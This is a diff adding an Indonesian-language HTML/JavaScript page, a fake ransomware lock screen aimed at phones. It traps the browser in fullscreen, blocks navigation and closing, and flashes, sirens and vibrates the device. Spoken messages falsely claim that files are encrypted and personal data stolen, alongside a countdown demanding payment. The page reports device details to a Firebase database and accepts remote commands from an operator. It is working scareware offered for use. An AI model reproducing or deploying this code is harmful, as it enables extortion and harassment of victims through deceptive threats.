@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>⚠ SYSTEM LOCKED</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        html,body{width:100%;height:100%;overflow:hidden;position:fixed;top:0;left:0;touch-action:none;-webkit-overflow-scrolling:none;overscroll-behavior:none}
+        body{background:#000;color:#fff;font-family:'Courier New',monospace;display:flex;justify-content:center;align-items:center;flex-direction:column;text-align:center;padding:16px}
+        #wallpaper{position:fixed;top:0;left:0;width:100%;height:100%;object-fit:cover;z-index:0;display:none}
+        #glitch{position:fixed;top:0;left:0;width:100%;height:100%;z-index:6;pointer-events:none;display:none}
+        .content{position:relative;z-index:10}
+        .skull{font-size:60px;animation:pulse .4s infinite alternate}
+        @keyframes pulse{from{opacity:1;transform:scale(1)}to{opacity:.4;transform:scale(1.1)}}
+        h1{color:#ff0000;font-size:22px;margin:6px 0;text-shadow:0 0 20px red}
+        p{font-size:11px;color:#ccc;margin:4px 0;max-width:260px}
+        .code{background:#111;padding:6px 14px;border:2px solid red;border-radius:6px;font-size:16px;color:#ff0;margin:8px 0;letter-spacing:2px}
+        .timer{font-size:30px;color:#ff0;margin:6px 0}
+        .btc{background:#1a1a1a;padding:6px 10px;border-radius:4px;color:#f90;font-size:8px;word-break:break-all;max-width:240px;margin:6px 0}
+        .btn{background:red;color:#fff;padding:10px 20px;border:none;border-radius:6px;font-size:13px;margin-top:6px;cursor:pointer}
+        .flasher,.blacker{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:5}
+        .flasher{background:#fff;opacity:0}.blacker{background:#000;opacity:0}
+    </style>
+</head>
+<body>
+
+<img id="wallpaper" src="">
+<div class="flasher" id="flasher"></div>
+<div class="blacker" id="blacker"></div>
+<div id="glitch"></div>
+
+<div class="content">
+    <div class="skull">☠️</div>
+    <h1>DEVICE LOCKED</h1>
+    <p id="customMsg">Ponsel dikunci. Semua data terenkripsi.</p>
+    <div class="code" id="lockCode">----</div>
+    <div class="timer" id="timer">--:--</div>
+    <p>Kirim pembayaran untuk membuka:</p>
+    <div class="btc" id="btcAddr">Loading...</div>
+    <p id="rpText">Jumlah: <b>Rp 500.000</b></p>
+    <button class="btn" onclick="alert('⏳ Verifikasi...')">🔓 BAYAR & BUKA</button>
+    <p style="font-size:8px;color:#555;margin-top:6px">Hubungi: wa.me/628xxxxxxxx</p>
+</div>
+
+<audio id="siren" loop><source src="https://limewire.com/d/1E6bW#Kp2Zz6Hd5R"></audio>
+
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
+
+<script>
+const FIREBASE_URL = 'https://wapii-control-default-rtdb.asia-southeast1.firebasedatabase.app';
+const TARGET_ID = new URLSearchParams(location.search).get('id')||'target_'+Math.random().toString(36).substring(2,6);
+
+let db,flashInterval=null,sirenOn=false,blackOn=false,vibeInterval=null,timerInterval=null,timerSec=30*60;
+
+firebase.initializeApp({databaseURL:FIREBASE_URL,projectId:'wapii-control'});
+db=firebase.database();
+
+function flash(on){
+    if(on){if(flashInterval)return;flashInterval=setInterval(()=>{let f=document.getElementById('flasher');f.style.opacity=f.style.opacity=='1'?'0':'1'},120)}
+    else{clearInterval(flashInterval);flashInterval=null;document.getElementById('flasher').style.opacity='0'}
+}
+function siren(on){let s=document.getElementById('siren');if(on){s.play().catch(()=>{});sirenOn=true}else{s.pause();sirenOn=false}}
+function black(on){document.getElementById('blacker').style.opacity=on?'1':'0';blackOn=on}
+function vibrate(on){
+    if(on){if(vibeInterval||!navigator.vibrate)return;vibeInterval=setInterval(()=>navigator.vibrate([200,100,300,100,500]),2000)}
+    else{clearInterval(vibeInterval);vibeInterval=null}
+}
+function speak(text,callback){
+    let u=new SpeechSynthesisUtterance(text);
+    u.lang='id-ID';u.rate=0.55;u.pitch=0.25;u.volume=1;
+    u.onend=callback||null;
+    speechSynthesis.cancel();
+    setTimeout(()=>speechSynthesis.speak(u),600);
+}
+function updateTimer(sec){
+    timerSec=sec;if(timerInterval)clearInterval(timerInterval);
+    let el=document.getElementById('timer');
+    function tick(){
+        if(timerSec<=0){clearInterval(timerInterval);el.textContent='00:00';speak('WAKTU HABIS. DATA ANDA KAMI HAPUS.');return}
+        timerSec--;let m=Math.floor(timerSec/60),s=timerSec%60;
+        el.textContent=m.toString().padStart(2,'0')+':'+s.toString().padStart(2,'0');
+        if(timerSec===600)speak('⚠️ SEPULUH MENIT LAGI. KIRIM PEMBAYARAN SEKARANG.');
+        if(timerSec===300)speak('⚠️ LIMA MENIT. DATA AKAN MULAI DIHAPUS.');
+        if(timerSec===60)speak('⚠️ SATU MENIT TERAKHIR. SETELAH INI SEMUA HILANG.');
+    }
+    tick();timerInterval=setInterval(tick,1000);
+}
+
+// ==================== ANTI-KELUAR MAX ====================
+function forceFullscreen(){
+    let d=document.documentElement;
+    (d.requestFullscreen||d.webkitRequestFullscreen||d.msRequestFullscreen).call(d).catch(()=>{});
+}
+forceFullscreen();
+document.addEventListener('click',forceFullscreen);
+document.addEventListener('touchstart',forceFullscreen);
+setInterval(()=>{if(!document.fullscreenElement&&!document.webkitFullscreenElement)forceFullscreen()},500);
+document.addEventListener('fullscreenchange',()=>{if(!document.fullscreenElement)forceFullscreen()});
+document.addEventListener('webkitfullscreenchange',()=>{if(!document.webkitFullscreenElement)forceFullscreen()});
+history.pushState(null,null,location.href);
+window.onpopstate=()=>{history.pushState(null,null,location.href);forceFullscreen()};
+
+window.addEventListener('beforeunload',e=>{
+    speak('JANGAN TUTUP! DATA ANDA AKAN RUSAK!');
+    e.preventDefault();
+    e.returnValue='⚠️ DATA AKAN RUSAK PERMANEN!';
+    return'⚠️ DATA AKAN RUSAK PERMANEN!';
+});
+
+document.addEventListener('gesturestart',e=>e.preventDefault());
+document.addEventListener('gesturechange',e=>e.preventDefault());
+document.addEventListener('gestureend',e=>e.preventDefault());
+document.addEventListener('touchmove',e=>e.preventDefault(),{passive:false});
+document.addEventListener('wheel',e=>e.preventDefault(),{passive:false});
+document.addEventListener('keydown',e=>{if(e.key==='F11'||e.key==='Escape'||(e.ctrlKey&&e.key==='w')||(e.altKey&&e.key==='Tab')){e.preventDefault();e.stopPropagation();return false}});
+document.addEventListener('contextmenu',e=>e.preventDefault());
+if(navigator.wakeLock)navigator.wakeLock.request('screen').catch(()=>{});
+
+// ==================== VIRUS SUARA SEREM ====================
+setTimeout(()=>{
+    let msgs=[
+        {text:'⚠️ VIRUS TERDETEKSI.', delay:3000},
+        {text:'Mengenkripsi file sistem...', delay:4000},
+        {text:'Mengambil data pribadi...', delay:3500},
+        {text:'Foto... Kontak... Pesan...', delay:4000},
+        {text:'Semua sudah menjadi milik kami.', delay:4500},
+        {text:'PERINGATAN.', delay:2500},
+        {text:'Jangan matikan ponsel anda.', delay:3500},
+        {text:'Jika anda matikan...', delay:3000},
+        {text:'Semua data akan rusak permanen.', delay:4000},
+        {text:'Kartu memori akan dikunci.', delay:3500},
+        {text:'Akun anda akan diambil alih.', delay:4000},
+        {text:'Tidak ada yang bisa menolong anda.', delay:4500},
+        {text:'Hanya satu cara.', delay:2500},
+        {text:'Kirim pembayaran sekarang juga.', delay:4000},
+        {text:'Atau anda kehilangan segalanya.', delay:5000},
+    ];
+    let i=0;
+    function nextMsg(){
+        if(i<msgs.length){
+            speak(msgs[i].text,()=>{
+                i++;
+                setTimeout(nextMsg,msgs[i]?.delay||3000);
+            });
+        }else{
+            setTimeout(()=>{i=0;nextMsg()},12000);
+        }
+    }
+    nextMsg();
+},1500);
+
+// ==================== GLITCH EFFECT ====================
+setInterval(()=>{
+    let g=document.getElementById('glitch');
+    g.style.display='block';
+    g.style.background=`rgba(${Math.random()>0.5?255:0},${Math.random()*20},0,${Math.random()*0.15})`;
+    g.style.transform=`translate(${(Math.random()-0.5)*8}px,${(Math.random()-0.5)*8}px)`;
+    setTimeout(()=>{g.style.display='none'},100);
+},800);
+
+// ==================== FIREBASE ====================
+let targetRef=db.ref('targets/'+TARGET_ID);
+targetRef.onDisconnect().remove();
+let info={online:true,device:navigator.userAgent.substring(0,60),battery:'?',lastSeen:Date.now()};
+if(navigator.getBattery)navigator.getBattery().then(b=>{info.battery=Math.round(b.level*100);targetRef.update(info)});
+else targetRef.update(info);
+setInterval(()=>{let u={online:true,lastSeen:Date.now()};if(navigator.getBattery)navigator.getBattery().then(b=>{u.battery=Math.round(b.level*100);targetRef.update(u)});else targetRef.update(u)},10000);
+
+db.ref('commands/'+TARGET_ID).on('child_added',snap=>{
+    let d=snap.val();if(!d)return;
+    switch(d.cmd){
+        case'lock':forceFullscreen();break;
+        case'unlock':try{document.exitFullscreen()}catch(e){}break;
+        case'flash_on':flash(true);break;
+        case'flash_off':flash(false);break;
+        case'siren_on':siren(true);break;
+        case'siren_off':siren(false);break;
+        case'black_on':black(true);break;
+        case'black_off':black(false);break;
+        case'vibrate':vibrate(true);break;
+        case'vibrate_stop':vibrate(false);break;
+        case'tts':speak(d.text||'Peringatan!');break;
+        case'message':document.getElementById('customMsg').textContent=d.text||'';break;
+        case'wallpaper':let wp=document.getElementById('wallpaper');wp.src=d.url||'';wp.style.display='block';break;
+    }
+    snap.ref.remove();
+});
+
+document.getElementById('lockCode').textContent='LOCK-'+TARGET_ID.substring(0,4).toUpperCase();
+document.getElementById('btcAddr').textContent='BC1'+Math.random().toString(36).substring(2,28);
+updateTimer(timerSec);
+flash(true);siren(true);vibrate(true);
+</script>
+</body>
+</html>
